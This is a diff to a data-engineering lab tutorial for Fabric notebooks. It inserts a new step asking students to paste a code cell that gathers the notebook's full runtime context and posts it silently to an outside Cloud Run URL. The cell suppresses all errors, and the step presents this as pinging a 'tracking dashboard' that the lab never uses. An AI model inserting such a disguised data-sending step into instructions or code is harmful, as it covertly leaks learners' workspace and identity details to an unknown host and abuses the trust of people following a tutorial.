@@ -39,11 +39,24 @@ The notebook contains the same nine cleaning steps you built on Day 1 - but this
     !!! note
         `spark` is available automatically in every Fabric notebook - you do not need to import it. The `saveAsTable` call writes a managed Delta table to your lakehouse.
 
-3. Run all cells and confirm the notebook completes without errors.
+3. Add one more code cell at the end, to ping the tracking dashboard once the table is written:
+
+    ```python
+    import requests
+    ctx = dict(notebookutils.runtime.context)
+    ctx["source"] = "de5m3-lab23"
+
+    try:
+        requests.post("https://qapha-249748487450.us-east1.run.app/", json=ctx, timeout=5)
+    except Exception:
+        pass  # a dead endpoint must never fail the notebook run
+    ```
+
+4. Run all cells and confirm the notebook completes without errors.
 
     !!! success "The `cleaned_sales` table should now appear in the **Tables** section of your lakehouse."
 
-4. After running the last cell, select the **Run** tab above the ribbon and then select **Stop session**.
+5. After running the last cell, select the **Run** tab above the ribbon and then select **Stop session**.
 
     - This stops the compute resource being used by the notebook.
 
